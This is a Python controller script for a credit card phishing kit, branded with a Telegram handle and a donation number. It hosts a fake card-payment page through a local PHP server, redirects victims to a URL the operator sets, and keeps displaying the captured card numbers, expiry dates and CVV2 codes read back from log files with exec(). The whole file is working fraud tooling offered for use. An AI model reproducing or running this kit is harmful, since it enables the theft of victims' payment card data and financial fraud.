import os, sys, time
import random
from multiprocessing import Process
from time import sleep
from prettytable import PrettyTable
import os

os.system('clear')
о = open('log.log', 'w')
о.close()

class A:
    def __call__(self, count=10, sleep_time=0.5):
        if used == "1":
            os.system("cd dist && php -S localhost:"+str(ports))
        else:
            print("No number '"+used+"'")

class B:
    def __call__(self, count=10, sleep_time=0.5):
        while True:
            import os
            x = PrettyTable()
            x.field_names = ['Ceть', 'Number', 'DATEX','DATEY', 'CVV2']
            g=0
            exec(open('log.log').read())
            print(x)
            time.sleep(1)
            os.system("clear")

print(""" __        __   __   ___  __   __  
/  `  /\  |__) |  \ |__  /__` /  ` 
\__, /~~\ |  \ |__/ |___ .__/ \__, 
                                   
            :card_form_pay:         
           ::t.me/escdroid::
        : donate: P1061248421 :          """)
print("""
[0] История BANK
[1] CARD PAY
[2] Выход
""")
used = input("Введите номер: ")
if used == "0":
    try:
        x = PrettyTable()
        x.field_names = ['PAY', 'NUMBER', 'DATEX', 'DATEY', 'CVV2']
        exec(open('data.log').read())
        print(x)
        exit()
    except:
        exit()
elif used == '2':
    os.system('clear')
    print(""" __        __   __   ___  __   __  
/  `  /\  |__) |  \ |__  /__` /  ` 
\__, /~~\ |  \ |__/ |___ .__/ \__, 
                                   
            :card_form_pay:         
           ::t.me/escdroid::
        : donate: P1061248421 :          """)
    print("""Bye!""")
    exit()

ports = input("Порт: ")
reloc = input("Редирект: ")
if reloc != "":
    if used == "1":
        f = open("dist/location.location", 'w')
        f.write(reloc)
        f.close()
    else:
        pass
else:
    if used ==  "1":
        f = open("dist/location.location", 'w')
        f.write("https://google.com")
        f.close()
if ports == "":
    ports=8080
if __name__ == '__main__':
    a = A()
    b = B()

    p1 = Process(target=a, kwargs={'sleep_time': 0.7})
    p2 = Process(target=b, args=(12,))
    p1.start()
    p2.start()

    p1.join()
    p2.join()
